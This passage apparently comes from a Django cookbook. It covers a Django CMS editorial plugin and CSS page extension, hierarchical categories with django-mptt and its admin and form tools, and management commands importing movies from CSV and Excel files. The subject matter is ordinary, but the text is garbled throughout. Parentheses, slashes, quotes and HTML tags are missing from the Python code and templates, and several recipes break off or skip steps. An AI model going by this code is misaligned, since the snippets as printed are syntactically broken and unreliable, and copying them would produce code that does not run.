Content" ,         "plugins":               "EditorialContentPlugin",             "TextPlugin",          ,     },     "cms magazine.html main_content": {         "name": gettext "Magazine Main Content" ,         "plugins":               "EditorialContentPlugin",             "TextPlugin"          ,  365  Chapter 7           "extra_context": {             "editorial_content_template": \             "cms plugins editorial_content magazine.html",         }     }, }  4.  Then, we will create two templates. One of them will be the editorial_content.  html template. It checks whether the editorial_content_template context  variable exists. If the variable exists, it is included. Otherwise, it shows the default  layout for editorial content: { templates cms plugins editorial_content.html } {% load i18n %}  {% if editorial_content_template %}     {% include editorial_content_template %} {% else %}     <div class="item{% if object.css_class %} {{ object.css_class  }}{% endif %}">                                 {% if object.image %}                 <img class="img-responsive" alt="{{ object.image_ captionstriptags }}" src="{{ object.image.url }}"  >             {% endif %}             {% if object.image_caption %} {{  object.image_captionremovetags:"p" }}              {% endif %}                     {{ object.title }}<  a>           {{ object.subtitle }}           {{ object.descriptionsafe }}<  div>       {% endif %}  5.  The second template is a specific template for the EditorialContent plugin in the   cms magazine.html template. There's nothing too fancy here, just an additional  Bootstrap-specific well CSS class for the container to make the plugin stand out: { templates cms plugins editorial_content magazine.html } {% load i18n %} <div class="well item{% if object.css_class %} {{ object.css_class  }}{% endif %}">        366  Django CMS                 {% if object.image %}             <img class="img-responsive" alt="{{ object.image_ captionstriptags }}" src="{{ object.image.url }}"  >         {% endif %}         {% if object.image_caption %} {{ object. image_captionremovetags:"p" }}          {% endif %}             {{ object.title }}        {{ object.subtitle }}       {{ object.descriptionsafe }}     How it works... If you go to the Draft mode of any CMS page and switch to the Structure section, you can add  the Editorial Content plugin to a placeholder. The content of this plugin will be rendered with  a specified template and it can also be customized, depending on the template of the page  where the plugin is chosen. For example, choose the cms magazine.html template for the  News page and then add the Editorial Content plugin. The News page will look similar to the  following screenshot:  367  Chapter 7   Here, the Test Title with an image and description is the custom plugin inserted in the  main_content placeholder in the magazine.html page template. If the page template  was different, the plugin would be rendered without the Bootstrap-specific well CSS class;  therefore, it would not have a gray background.  See also   f The Creating templates for Django CMS recipe  f The Structuring the page menu recipe  Adding new fields to the CMS page CMS pages have several multilingual fields such as title, slug, menu title, page title, description  meta tag, and overwrite URL. They also have several common nonlanguage-specific fields such  as template, ID used in template tags, attached application, and attached menu. However,  that might not be enough for more complex websites. Thankfully, Django CMS features a  manageable mechanism to add new database fields for CMS pages. In this recipe, you will see  how to add fields for the CSS classes for the navigational menu items and page body.  Getting ready Let's create the cms_extensions app and put it under INSTALLED_APPS in the settings.  How to do it... To create a CMS page extension with the CSS class fields for the navigational menu items and  page body, follow these steps:  1.   In the models.py file, create a CSSExtension class extending PageExtension  and put fields for the menu item's CSS class and   CSS class, as follows:  cms_extensions models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from cms.extensions import PageExtension from cms.extensions.extension_pool import extension_pool  MENU_ITEM_CSS_CLASS_CHOICES =    368  Django CMS        "featured", ".featured" ,    BODY_CSS_CLASS_CHOICES =        "serious", ".serious" ,      "playful", ".playful" ,    class CSSExtension PageExtension :     menu_item_css_class = models.CharField          _ "Menu Item CSS Class" ,         max_length=200,         blank=True,         choices=MENU_ITEM_CSS_CLASS_CHOICES,           body_css_class = models.CharField          _ "Body CSS Class" ,         max_length=200,         blank=True,         choices=BODY_CSS_CLASS_CHOICES,        extension_pool.register CSSExtension   2.   In the admin.py file, let's add administration options for the CSSExtension model  that we just created:  cms_extensions admin.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.contrib import admin from cms.extensions import PageExtensionAdmin from .models import CSSExtension  class CSSExtensionAdmin PageExtensionAdmin :     pass  admin.site.register CSSExtension, CSSExtensionAdmin   3.  Then, we need to show the CSS extension in the toolbar for each page. This can be   done by putting the following code in the cms_toolbar.py file of the app:  cms_extensions cms_toolbar.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from cms.api import get_page_draft  369  Chapter 7   from cms.toolbar_pool import toolbar_pool from cms.toolbar_base import CMSToolbar from cms.utils import get_cms_setting from cms.utils.permissions import has_page_change_permission from django.core.urlresolvers import reverse, NoReverseMatch from django.utils.translation import ugettext_lazy as _ from .models import CSSExtension  @toolbar_pool.register class CSSExtensionToolbar CMSToolbar :     def populate self :          always use draft if we have a page         self.page = get_page_draft              self.request.current_page           if not self.page:              Nothing to do             return           check global permissions          if CMS_PERMISSIONS is active         if get_cms_setting "PERMISSION" :             has_global_current_page_change_permission = \                 has_page_change_permission self.request          else:             has_global_current_page_change_permission = \                 False              check if user has page edit permission         can_change = self.request.current_page and \                      self.request.current_page.\                          has_change_permission self.request          if has_global_current_page_change_permission or \             can_change:             try:                 extension = CSSExtension.objects.get                      extended_object_id=self.page.id              except CSSExtension.DoesNotExist:                 extension = None             try:                 if extension:                     url = reverse                 "admin:cms_extensions_cssextension_change",                         args= extension.pk,                         370  Django CMS                   else:                     url = reverse                 "admin:cms_extensions_cssextension_add"  + \                     "?extended_object=%s" % self.page.pk             except NoReverseMatch:                  not in urls                 pass             else:                 not_edit_mode = not self.toolbar.edit_mode                 current_page_menu = self.toolbar.\                     get_or_create_menu "page"                  current_page_menu.add_modal_item                      _ "CSS" ,                     url=url,                     disabled=not_edit_mode                    This code checks whether the user has the permission to change the current page,  and if so, it loads the page menu from the current toolbar and adds a new menu  item, CSS, with the link to create or edit CSSExtension.  4.  As we want to access the CSS extension in the navigation menu in order to attach a  CSS class, we need to create a menu modifier in the menu.py file of the same app:  cms_extensions menu.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from cms.models import Page from menus.base import Modifier from menus.menu_pool import menu_pool  class CSSModifier Modifier :     def modify self, request, nodes, namespace, root_id,         post_cut, breadcrumb :         if post_cut:             return nodes         for node in nodes:             try:                 page = Page.objects.get pk=node.id              except:                 continue             try:                 page.cssextension             except:                 pass             else:  371  Chapter 7                   node.cssextension = page.cssextension         return nodes  menu_pool.register_modifier CSSModifier   5.  Then, we will add the body CSS class to the   element in the base.html   template, as follows: { templates base.html } <body class="{% block bodyclass %}{% endblock %}{% if request. current_page.cssextension %}{{ request.current_page.cssextension. body_css_class }}{% endif %}">  6.  Lastly, we will modify the menu.html file, which is the default template for the   navigation menu, and add the menu item's CSS class as follows: { templates menu menu.html } {% load i18n menu_tags cache %}  {% for child in children %}     <li class="{% if child.ancestor %}ancestor{% endif %} {% if child.selected %} active{% endif %}{% if child.children  %} dropdown{% endif %}{% if child.cssextension %} {{ child. cssextension.menu_item_css_class }}{% endif %}">         {% if child.children %}<a class="dropdown-toggle" data- toggle="dropdown" href="">{{ child.get_menu_title }} <span  class="caret">                                 {% show_menu from_level to_level extra_inactive  extra_active template "" "" child %}                       {% else %}               {{ child. get_menu_title }}           {% endif %}       {% endfor %}  372  Django CMS   How it works... The PageExtension class is a model mixin with a one-to-one relationship with the Page  model. To be able to administrate the custom extension model in Django CMS, there is a  specific PageExtensionAdmin class to extend. Then, in the cms_toolbar.py file, we will  create the CSSExtensionToolbar class, inheriting from the CMSToolbar class, to create  an item in the Django CMS toolbar. In the populate   method, we will perform the general  routine to check the page permissions and then we will add a CSS menu item to the toolbar.  If the administrator has the permission to edit the page, then they will see a CSS option in the  toolbar under the Page menu item, as shown in the following screenshot:  373  Chapter 7   When the administrator clicks on the new CSS menu item, a pop-up window opens and   they can select the CSS classes for the navigation menu item and body, as shown in the  following screenshot:  To show a specific CSS class from the Page extension in the navigation menu, we need to  attach the CSSExtension object to the navigation items accordingly. Then, these objects  can be accessed in the menu.html template as {{ child.cssextension }}. In the end,  you will have some navigation menu items highlighted, such as the Music item shown here   depending on your CSS :  To show a specific CSS class for   of the current page is much simpler. We can use {{  request.current_page.cssextension.body_css_class }} right away.  See also  374   f The Creating templates for Django CMS recipe  Django CMS   8  Hierarchical Structures  In this chapter, we will cover the following recipes:   f Creating hierarchical categories  f Creating a category administration interface with django-mptt-admin  f Creating a category administration interface with django-mptt-tree-editor  f Rendering categories in a template  f Using a single selection field to choose a category in forms  f Using a checkbox list to choose multiple categories in forms  Introduction Whether you build your own forum, threaded comments, or categorization system, there will  be a moment when you need to save hierarchical structures in the database. Although the  tables of relational databases  such as MySQL and PostgreSQL  are of a flat manner, there is  a fast and effective way to store hierarchical structures. It is called Modified Preorder Tree  Traversal  MPTT . MPTT allows you to read the tree structures without recursive calls to   the database.  At first, let's get familiar with the terminology of the tree structures. A tree data structure is a  recursive collection of nodes, starting at the root node and having references to child nodes.  There is a restriction that no node references back to create a loop and no reference is  duplicated. The following are some other terms to learn:   f Parent is any node that is referencing to the child nodes.  f Descendants are the nodes that can be reached by recursively traversing from a   parent to its children. Therefore, the node's descendants will be its child, the child's  children, and so on.  375    f Ancestors are the nodes that can be reached by recursively traversing from a child to  its parent. Therefore, the node's ancestors will be its parent, the parent's parent, and  so on up to the root.   f Siblings are the nodes with the same parent.  f Leaf is a node without children.  Now, I'll explain how MPTT works. Imagine that you lay out your tree horizontally with the root  node at the top. Each node in the tree has left and right values. Imagine them as small left  and right handles on the left and right-hand side of the node. Then, you walk  traverse  around  the tree counter-clockwise, starting from the root node and mark each left or right value that  you find with a number: 1, 2, 3, and so on. It will look similar to the following diagram:  In the database table of this hierarchical structure, you will have a title, left value, and right  value for each node.  Now, if you want to get the subtree of the B node with 2 as the left value and 11 as the right  value, you will have to select all the nodes that have a left value between 2 and 11. They are  C, D, E, and F.  To get all the ancestors of the D node with 5 as the left value and 10 as the right value, you  have to select all the nodes that have a left value that is less than 5 and a right value that is  more than 10. These would be B and A.  376  Hierarchical Structures   To get the number of the descendants for a node, you can use the following formula:  descendants =  right - left - 1    2  Therefore, the number of descendants for the B node can be calculated as shown in the  following:  11 - 2 - 1    2 = 4  If we want to attach the E node to the C node, we will have to update the left and right values  only for the nodes of their first common ancestor, the B node. Then, the C node will still have  3 as the left value; the E node will get 4 as the left value and 5 as the right value; the right  value of the C node will become 6; the left value of the D node will become 7; the left value of  the F node will stay 8; and the others will also remain the same.  Similarly, there are other tree-related operations with nodes in MPTT. It might be too  complicated to manage all this by yourself for every hierarchical structure in your project.  Luckily, there is a Django app called django-mptt that handles these algorithms and   provides an easy API to handle the tree structures. In this chapter, you will learn how   to use this helper app.  Creating hierarchical categories To illustrate how to deal with MPTT, we will create a movies app that will have a hierarchical  Category model and a Movie model with a many-to-many relationship with the categories.  Getting ready To get started, perform the following steps:  1.   Install django-mptt in your virtual environment using the following command:  myproject_env $ pip install django-mptt  2.  Then, create a movies app. Add the movies app as well as mptt to INSTALLED_  APPS in the settings, as follows:  conf base.py or settings.py INSTALLED_APPS =        ...     "mptt",     "movies",    377  Chapter 8   How to do it... We will create a hierarchical Category model and a Movie model, which will have a many-to- many relationship with the categories, as follows:  1.  Open the models.py file and add a Category model that extends mptt.models.  MPTTModel and CreationModificationDateMixin, which we defined in  Chapter 2, Database Structure. In addition to the fields coming from the mixins, the  Category model will need to have a parent field of the TreeForeignKey type and  a title field:  movies models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import \     python_2_unicode_compatible from utils.models import CreationModificationDateMixin from mptt.models import MPTTModel from mptt.fields import TreeForeignKey, TreeManyToManyField  @python_2_unicode_compatible class Category MPTTModel, CreationModificationDateMixin :     parent = TreeForeignKey "self", blank=True, null=True      title = models.CharField _ "Title" , max_length=200       def __str__ self :         return self.title      class Meta:         ordering = ["tree_id", "lft"]         verbose_name = _ "Category"          verbose_name_plural = _ "Categories"   2.  Then, create the Movie model that extends CreationModificationDateMixin.   Also, include a title field and a categories field of the TreeManyToManyField type: @python_2_unicode_compatible class Movie CreationModificationDateMixin :     title = models.CharField _ "Title" , max_length=255      categories = TreeManyToManyField Category,         verbose_name=_ "Categories"        def __str__ self :  378  Hierarchical Structures           return self.title      class Meta:         verbose_name = _ "Movie"          verbose_name_plural = _ "Movies"   How it works... The MPTTModel mixin will add the tree_id, lft, rght, and level fields to the Category  model. The tree_id field is used as you can have multiple trees in the database table. In  fact, each root category is saved in a separate tree. The lft and rght fields store the left and  right values used in the MPTT algorithms. The level field stores the node's depth in the tree.  The root node will be level 0.  Besides new fields, the MPTTModel mixin adds methods to navigate through the tree  structure similar to how you would navigate through DOM elements using JavaScript. These  methods are listed as follows:   f If you want to get the ancestors of a category, use the following code:  ancestor_categories = category.get_ancestors      ascending=False,     include_self=False,    The ascending parameter defines from which direction to read the nodes  the default  is False . The include_self parameter defines whether to include the category  itself in QuerySet  the default is False .   f To just get the root category, use the following code:  root = category.get_root     f If you want to get the direct children of a category, use the following code:  children = category.get_children     f To get all the descendants of a category, use the following code:  descendants = category.get_descendants include_self=False   Here, the include_self parameter again defines whether or not to include the  category itself in QuerySet.   f If you want to get the descendant count without querying the database, use the   following code: descendants_count = category.get_descendant_count    379  Chapter 8    f To get all the siblings, call the following method:  siblings = category.get_siblings include_self=False   Root categories are considered to be siblings of other root categories.   f To just get the previous and next siblings, call the following methods:  previous_sibling = category.get_previous_sibling   next_sibling = category.get_next_sibling     f Also, there are methods to check whether the category is a root, child, or leaf,    as follows: category.is_root_node   category.is_child_node   category.is_leaf_node    All these methods can be used either in the views, templates, or management commands. If  you want to manipulate the tree structure, you can also use the insert_at   and move_ to   methods. In this case, you can read about them and the tree manager methods at  http:  django-mptt.github.io django-mptt models.html.  In the preceding models, we used TreeForeignKey and TreeManyToManyField. These  are similar to ForeignKey and ManyToManyField, except that they show the choices  indented in hierarchies in the administration interface.  Also, note that in the Meta class of the Category model, we order the categories by tree_ id and then by the lft value in order to show the categories naturally in the tree structure.

To reorder trees, you need to either create  this functionality yourself or use a third-party solution. Currently, there are two apps that can  help you to create a draggable administration interface for hierarchical models. One of them  is django-mptt-admin. Let's take a look at it in this recipe.  380  Hierarchical Structures   Getting ready First, we need to have the django-mptt-admin app installed by performing the   following steps:  1.  To start, install the app in your virtual environment using the following command:   myproject_env $ pip install django-mptt-admin  2.  Then, put it in INSTALLED_APPS in the settings, as follows:   conf base.py or settings.py INSTALLED_APPS =        ...     "django_mptt_admin"    How to do it... Create an administration interface for the Category model that extends DjangoMpttAdmin  instead of admin.ModelAdmin, as follows:   movies admin.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.contrib import admin from django_mptt_admin.admin import DjangoMpttAdmin from .models import Category  class CategoryAdmin DjangoMpttAdmin :     list_display = ["title", "created", "modified"]     list_filter = ["created"]  admin.site.register Category, CategoryAdmin   381  Chapter 8   How it works... The administration interface for the categories will have two modes: Tree view and Grid view.  The Tree view looks similar to the following screenshot:  382  Hierarchical Structures   The Tree view uses the jqTree jQuery library for node manipulation. You can expand and  collapse categories for a better overview. To reorder them or change the dependencies, you  can drag and drop the titles in this list view. During reordering, the user interface looks similar  to the following screenshot:  Note that any usual list-related settings such as list_display  or list_filter will be ignored.  If you want to filter categories, sort or filter them by a specific field, or apply admin actions, you  can switch to the Grid view, which shows the default category change list.  See also   f The Creating hierarchical categories recipe  f The Creating a category administration interface with django-mptt-tree-editor recipe  383  Chapter 8   Creating a category administration interface  with django-mptt-tree-editor If you want to use the common functionality of the change list, such as columns, admin  actions, editable fields, or filters, in your administration interface as well as manipulate the  tree structure in the same view, you need to use another third-party app called django- mptt-tree-editor. Let's see how to do that.  Getting ready First, we need to have the django-mptt-tree-editor app installed. Perform the   following steps:  1.  To start, install the app in your virtual environment using the following command:   myproject_env $ pip install django-mptt-tree-editor  2.  Then, put it in INSTALLED_APPS in the settings, as follows:   conf base.py or settings.py INSTALLED_APPS =        ...     "mptt_tree_editor"    How to do it... Create an administration interface for the Category model that extends TreeEditor  instead of admin.ModelAdmin. Make sure that you add indented_short_title and  actions_column at the beginning of the list_display setting, as follows:   movies admin.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.contrib import admin from mptt_tree_editor.admin import TreeEditor from .models import Category  class CategoryAdmin TreeEditor :     list_display = ["indented_short_title", "actions_column",           "created", "modified"]     list_filter = ["created"]  admin.site.register Category, CategoryAdmin   384  Hierarchical Structures   How it works... The administration interface for your categories now looks similar to the following screenshot:  385  Chapter 8   The category administration interface allows you to expand or collapse the categories.   The indented_short_title column will either return the indented short title from  the short_title   method of the category  if there is one  or the indented Unicode  representation of the category. The column defined as actions_column will be rendered  as a handle to reorder or restructure the categories by dragging and dropping them. As the  dragging handle is in a different column than the category title, it might feel weird to work with  it. During reordering, the user interface looks similar to the following screenshot:  As you can see, it is possible to use all the list-related features of the default Django  administration interface in the same view.  In django-mptt-tree-editor, the tree-editing functionality is ported from FeinCMS,  another content management system made with Django.  386  Hierarchical Structures   See also   f The Creating hierarchical categories recipe  f The Creating a category administration interface with django-mptt-admin recipe  Rendering categories in a template Once you have created categories in your app, you need to display them hierarchically in a  template. The easiest way to do this is to use the {% recursetree %} template tag from  the django-mptt app. I will show you how to do that in this recipe.  Getting ready Make sure that you have the Category model created and some categories entered in   the database.  How to do it... Pass QuerySet of your hierarchical categories to the template and then use the {%  recursetree %} template tag as follows:  1.  Create a view that loads all the categories and passes them to a template:   movies views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.shortcuts import render from .models import Category  def movie_category_list request :     context = {         "categories": Category.objects.all  ,     }     return render          request,         "movies movie_category_list.html",         context        2.  Create a template with the following content:  { templates movies movie_category_list.html } {% extends "base_single_column.html" %}  387  Chapter 8   {% load i18n utility_tags mptt_tags %}  {% block sidebar %} {% endblock %}  {% block content %}       {% recursetree categories %}                       {{ node.title }}             {% if not node.is_leaf_node %}                                       {{ children }}                               {% endif %}               {% endrecursetree %}   {% endblock %}  3.  Create a URL rule to show the view.  How it works... The template will be rendered as nested lists, as shown in the following screenshot:  388  Hierarchical Structures   The {% recursetree %} block template tag takes QuerySet of the categories and renders  the list using the template content in the tag. There are two special variables used here: node  and children. The node variable is an instance of the Category model. You can use its  fields or methods such as {{ node.get_descendant_count }}, {{ node.level }},  or {{ node.is_root }} to add specific CSS classes or HTML5 data-* attributes for  JavaScript. The second variable, children, defines where to place the children of the   current category.  There's more... If your hierarchical structure is very complex, with more than 20 depth levels, it is  recommended to use the non-recursive template filter, tree_info. For more information on  how to do this, refer to the official documentation at http:  django-mptt.github.io  django-mptt templates.htmltree-info-filter.  See also   f The Using HTML5 data attributes recipe in Chapter 4, Templates and JavaScript  f The Creating hierarchical categories recipe  f The Using a single selection field to choose a category in forms recipe  Using a single selection field to choose a  category in forms What happens if you want to show category selection in a form? How will the hierarchy be  presented? In django-mptt, there is a special TreeNodeChoiceField form field that   you can use to show the hierarchical structures in a selected field. Let's take a look at how   to do this.  Getting ready We will start with the movies app that we defined in the previous recipes.  How to do it... Let's create a form with the category field and then show it in a view:  1.   In the forms.py file of the app, create a form with a category field as follows:  movies forms.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals  389  Chapter 8   from django import forms from django.utils.translation import ugettext_lazy as _ from django.utils.html import mark_safe from mptt.forms import TreeNodeChoiceField from .models import Category  class MovieFilterForm forms.Form :     category = TreeNodeChoiceField          label=_ "Category" ,         queryset=Category.objects.all  ,         required=False,         level_indicator=mark_safe              "&nbsp;&nbsp;&nbsp;&nbsp;"          ,        2.  Then, create a URL rule, view, and template to show this form.  How it works... The category selection will look similar to the following:  390  Hierarchical Structures   The TreeNodeChoiceField acts like ModelChoiceField; however, it shows hierarchical  choices as indented. By default, TreeNodeChoiceField represents each deeper level  prefixed by three dashes, ---. In our example, we will change the level indicator to be four  nonbreakable spaces  the &nbsp; HTML entities  by passing the level_indicator  parameter to the field. To ensure that the nonbreakable spaces aren't escaped, we use the  mark_safe   function.  See also   f The Using a checkbox list to choose multiple categories in forms recipe  Using a checkbox list to choose multiple  categories in forms When more than one category needs to be selected in a form, you can use the  TreeNodeMultipleChoiceField multiple selection field that is provided by django-mptt.  However, multiple selection fields are not very user-friendly from GUI point of view as the user  needs to scroll and hold the control keys while clicking in order to make multiple choices. That's  really awful. A much better way will be to provide a checkbox list to choose the categories. In  this recipe, we will create a field that allows you to show the indented checkboxes in the form.  Getting ready We will start with the movies app that we defined in the previous recipes and also the utils  app that you should have in your project.  How to do it... To render an indented list of categories with checkboxes, create and use a new  MultipleChoiceTreeField form field and also create an HTML template for this field. The  specific template will be passed to the crispy forms layout in the form. To do this, perform the  following steps:  1.   In the utils app, add a fields.py file and create a MultipleChoiceTreeField  form field that extends ModelMultipleChoiceField, as follows:  utils fields.py  -*- coding: utf-8 -*- from __future__ import unicode_literals from django import forms  class MultipleChoiceTreeField   391  Chapter 8       forms.ModelMultipleChoiceField  :     widget = forms.CheckboxSelectMultiple      def label_from_instance self, obj :         return obj  2.  Use the new field with the categories to choose from in the form for movie creation.  Also, in the form layout, pass a custom template to the categories field, as shown in  the following:  movies forms.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django import forms from django.utils.translation import ugettext_lazy as _ from crispy_forms.helper import FormHelper from crispy_forms import layout, bootstrap from utils.fields import MultipleChoiceTreeField from .models import Movie, Category  class MovieForm forms.ModelForm :     categories = MultipleChoiceTreeField          label=_ "Categories" ,         required=False,         queryset=Category.objects.all  ,           class Meta:         model = Movie      def __init__ self, *args, **kwargs :         super MovieForm, self .__init__ *args, **kwargs          self.helper = FormHelper           self.helper.form_action = ""         self.helper.form_method = "POST"         self.helper.layout = layout.Layout              layout.Field "title" ,             layout.Field                   "categories",                  template="utils "\                      "checkbox_select_multiple_tree.html"              ,             bootstrap.FormActions                  layout.Submit "submit", _ "Save"  ,                          392  Hierarchical Structures   3.  Create a template for a Bootstrap-style checkbox list, as shown in the following:  { templates utils checkbox_select_multiple_tree.html } {% load crispy_forms_filters %} {% load l10n %}  <div id="div_{{ field.auto_id }}" class="form-group{% if wrapper_ class %} {{ wrapper_class }}{% endif %}{% if form_show_errors%} {% if field.errors %} has-error{% endif %}{% endif %}{% if field. css_classes %} {{ field.css_classes }}{% endif %}">     {% if field.label and form_show_labels %}         <label for="{{ field.id_for_label }}" class="control-label  {{ label_class }}{% if field.field.required %} requiredField{%  endif %}">             {{ field.labelsafe }}{% if field.field.required  %} * {% endif %}               {% endif %}     <div class="controls {{ field_class }}"{% if flat_attrs %} {{  flat_attrssafe }}{% endif %}>         {% include 'bootstrap3 layout field_errors_block.html' %}          {% for choice_value, choice_instance in field.field. choices %}             <label class="checkbox{% if inline_class %}-{{ inline_ class }}{% endif %} level-{{ choice_instance.level }}">                 <input type="checkbox"{% if choice_value in  field.value or choice_valuestringformat:"s" in field.value or  choice_valuestringformat:"s" == field.valuestringformat:"s" %}  checked="checked"{% endif %}  name="{{ field.html_name }}"id="id_{{ field.html_name }}_{{  forloop.counter }}"value="{{ choice_valueunlocalize }}"{{ field. field.widget.attrsflatatt }}>                 {{ choice_instance }}                       {% endfor %}         {% include "bootstrap3 layout help_text.html" %}          4.  Create a URL rule, view, and template to show the form with the {% crispy %}   template tag. To see how to use this template tag, refer to the Creating a form   layout with django-crispy-forms recipe in Chapter 3, Forms and Views.  393  Chapter 8   5.  Lastly, add a rule to your CSS file to indent the labels with classes, such as   .level-0, .level-1, .level-2, and so on, by setting the margin-left parameter.  Make sure that you have a reasonable amount of these CSS classes for a possible  maximal depth of the tree in your context, as follows:  * style.css *  .level-0 {     margin-left: 0; } .level-1 {     margin-left: 20px; } .level-2 {     margin-left: 40px; }  How it works... As a result, we get the following form:  394  Hierarchical Structures   Contrary to the default behavior of Django, which hardcodes field generation in the Python  code, the django-crispy-forms app uses templates to render the fields. You can browse  them under crispy_forms templates bootstrap3 and copy some of them to an  analogous path in your project's template directory and overwrite them when necessary.  In our movie creation form, we pass a custom template for the categories field that will add  the .level-* CSS classes to the   tag, wrapping the checkboxes. One problem with  the normal CheckboxSelectMultiple widget is that when rendered, it only uses choice  values and choice texts, and in our case, we need other properties of the category such  as the depth level. To solve this, we will created a custom MultipleChoiceTreeField  form field, which extends ModelMultipleChoiceField and overrides the label_from_ instance method to return the category itself instead of its Unicode representation.  The template for the field looks complicated; however, it is just a combination of a  common field template  crispy_forms templates bootstrap3 field.html  and  multiple checkbox field template  crispy_forms templates bootstrap3 layout  checkboxselectmultiple.html , with all the necessary Bootstrap 3 markup. We just  made a slight modification to add the .level-* CSS classes.

In this chapter, we will take a  look at some practical examples of how to write management commands and APIs to do this.  Importing data from a local CSV file The comma-separated values  CSV  format is probably the simplest way to store tabular data  in a text file. In this recipe, we will create a management command that imports data from  CSV to a Django database. We will need a CSV list of movies with a title, URL, and release  year. You can easily create such files with Excel, Calc, or another spreadsheet application.  9  397   Getting ready Create a movies app with the Movie model containing the following fields: title, url, and  release_year. Place the app under INSTALLED_APPS in the settings.  How to do it... Follow these steps to create and use a management command that imports movies from a  local CSV file:  1.   In the movies app, create a management directory and then a commands directory  in the new management directory. Put the empty __init__.py files in both new  directories to make them Python packages.  2.  Add an import_movies_from_csv.py file there with the following content:   movies management commands import_movies_from_csv.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import csv from django.core.management.base import BaseCommand from movies.models import Movie  SILENT, NORMAL, VERBOSE, VERY_VERBOSE = 0, 1, 2, 3  class Command BaseCommand :     help =           "Imports movies from a local CSV file. "         "Expects title, URL, and release year."            def add_arguments self, parser :          Positional arguments         parser.add_argument              "file_path",             nargs=1,             type=unicode,                def handle self, *args, **options :         verbosity = options.get "verbosity", NORMAL          file_path = options["file_path"][0]          if verbosity >= NORMAL:  398  Data Import and Export               self.stdout.write "=== Movies imported ==="           with open file_path  as f:             reader = csv.reader f              for rownum,  title, url, release_year  in \             enumerate reader :                 if rownum == 0:                      let's skip the column captions                     continue                 movie, created = \                 Movie.objects.get_or_create                      title=title,                     url=url,                     release_year=release_year,                                   if verbosity >= NORMAL:                     self.stdout.write "{}. {}".format                          rownum, movie.title                         3.  To run the import,  call the following in the command line:   myproject_env $ python manage.py import_movies_from_csv \  data movies.csv  How it works... For a management command, we need to create a Command class deriving from  BaseCommand and overwriting the add_arguments   and handle   method. The help  attribute defines the help text for the management command. It can be seen when you type  the following in the command line:   myproject_env $ python manage.py help import_movies_from_csv  Django management commands use the built-in argparse module to parse the passed  arguments. The add_arguments   method defines what positional or named arguments  should be passed to the management command. In our case, we will add a positional  file_path argument of Unicode type. By nargs set to the 1 attribute, we allow only one  value. To learn about the other arguments that you can define and how to do this, refer to the  official argparse documentation at https:  docs.python.org 2 library argparse. htmlthe-add-argument-method.  399  Chapter 9   At the beginning of the handle   method, the verbosity argument is checked. Verbosity  defines how verbose the command is, from 0 not giving any output to the command-line tool  to 3 being very verbose. You can pass this argument to the command as follows:   myproject_env $ python manage.py import_movies_from_csv \  data movies.csv --verbosity=0  Then, we also expect the filename as the first positional argument. The options["file_ path"] returns a list of the values defined in the nargs, therefore, it is one value in this case.  We open the given file and pass its pointer to csv.reader. Then, for each line in the file,  we will create a new Movie object if a matching movie doesn't exist yet. The management  command will print out the imported movie titles to the console, unless you set the verbosity  to 0.  If you want to debug the errors of a management command while  developing it, pass the --traceback parameter for it. If an error  occurs, you will see the full stack trace of the problem.

See also   f The Importing data from a local Excel file recipe  Importing data from a local Excel file Another popular format to store tabular data is an Excel spread sheet. In this recipe, we will  import movies from a file of this format.  Getting ready Let's start with the movies app that we created in the previous recipe. Install the xlrd  package to read Excel files, as follows:   project_env $ pip install xlrd  400  Data Import and Export   How to do it... Follow these steps to create and use a management command that imports movies from a  local XLS file:  1.   If you haven't done that, in the movies app, create a management directory and  then a commands directory in the new management directory. Put the empty   __init__.py files in both the new directories to make them Python packages.  2.

To run the import, call the following in the command line:   myproject_env $ python manage.py import_movies_from_xls \  data movies.xls  How it works... The principle of importing from an XLS file is the same as with CSV. We open the file, read it  row by row, and create the Movie objects from the provided data. A detailed explanation is   as follows.   f Excel files are workbooks containing sheets as different tabs.  f We are using the xlrd library to open a file passed as a positional argument to the   command. Then, we will read the first sheet from the workbook.   f Afterwards, we will read the rows one by one  except the first row with the column   titles  and create the Movie objects from them. Once again, the management  command will print out the imported movie titles to the console, unless you set the  verbosity to 0.  There's more...

The API allows  you to either use the JSON or XML format. In this recipe, we will import the top tracks tagged  disco using the JSON format.  Getting ready Follow these steps in order to import data in the JSON format from Last.fm:  1.  To use Last.fm, you need to register and get an API key. The API key can be created   at http:  www.last.fm api account create.  2.  The API key has to be set in the settings as LAST_FM_API_KEY. 3.

Follow these steps to create a Track model and management command, which imports top  tracks from Last.fm to the database:  1.  Let's create a music app with a simple Track model, as follows:   music models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os from django.utils.translation import ugettext_lazy as _ from django.db import models from django.utils.text import slugify from django.utils.encoding import \     python_2_unicode_compatible  def upload_to instance, filename :     filename_base, filename_ext = \         os.path.splitext filename      return "tracks %s--%s%s" %           slugify instance.artist ,         slugify instance.name ,         filename_ext.lower  ,        @python_2_unicode_compatible class Track models.Model :     name = models.CharField _ "Name" , max_length=250      artist = models.CharField _ "Artist" , max_length=250      url = models.URLField _ "URL"       image = models.ImageField _ "Image" ,         upload_to=upload_to, blank=True, null=True       class Meta:         verbose_name = _ "Track"          verbose_name_plural = _ "Tracks"       def __str__ self :         return "%s - %s" %  self.artist, self.name   2.

